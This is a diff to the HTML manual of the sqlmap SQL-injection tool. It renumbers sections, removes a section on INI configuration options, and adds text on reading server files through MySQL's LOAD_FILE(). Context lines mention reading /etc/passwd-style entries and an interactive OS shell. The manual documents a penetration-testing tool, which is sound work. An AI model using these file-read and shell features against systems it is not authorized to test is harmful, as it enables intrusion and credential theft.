+has <CODE>FILE</CODE> access (access to <CODE>LOAD_FILE()</CODE> builtin function),
+it is possible to read the content of a specific file from the file system.</P>
 
 <P>Example on a <B>MySQL 5.0.51</B> target:</P>
 <P>
@@ -2903,7 +2950,7 @@ inquis:x:1000:100:Bernardo Damele A. G.,,,:/home/inquis:/bin/bash
 </P>
 
 
-<H2><A NAME="ss5.7">5.7</A> <A HREF="#toc5.7">Operating system access</A>
+<H2><A NAME="ss5.8">5.8</A> <A HREF="#toc5.8">Operating system access</A>
 </H2>
 
 <H3>Prompt for an interactive operating system shell</H3>
@@ -2941,7 +2988,7 @@ $ exit
 functionalities of SQL shell.</P>
 
 
-<H2><A NAME="ss5.8">5.8</A> <A HREF="#toc5.8">Miscellaneous</A>
+<H2><A NAME="ss5.9">5.9</A> <A HREF="#toc5.9">Miscellaneous</A>
 </H2>
 
 <H3>Estimated time of arrival</H3>
@@ -3194,27 +3241,6 @@ back-end DBMS:  PostgreSQL
 4.2.3-2ubuntu4)
 banner:    'PostgreSQL 8.2.7 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 
 4.2.3-2ubuntu4)'
-</PRE>
-</CODE></BLOCKQUOTE>
-</P>
-
-
-<H3>Load options from a configuration INI file</H3>
-
-<P>Option: <CODE>-c</CODE></P>
-
-<P>It is possible to pass user's option from a configuration INI file, an
-example is <CODE>sqlmap.conf</CODE>.</P>
-
-<P>Example on a <B>MySQL 5.0.51</B> target:</P>
-<P>
-<BLOCKQUOTE><CODE>
-<PRE>
-$ python sqlmap.py -c "sqlmap.conf"
-
-[hh:mm:42] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:42] [WARNING] GET parameter 'cat' is not dynamic
-back-end DBMS:  MySQL >= 5.0.0
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
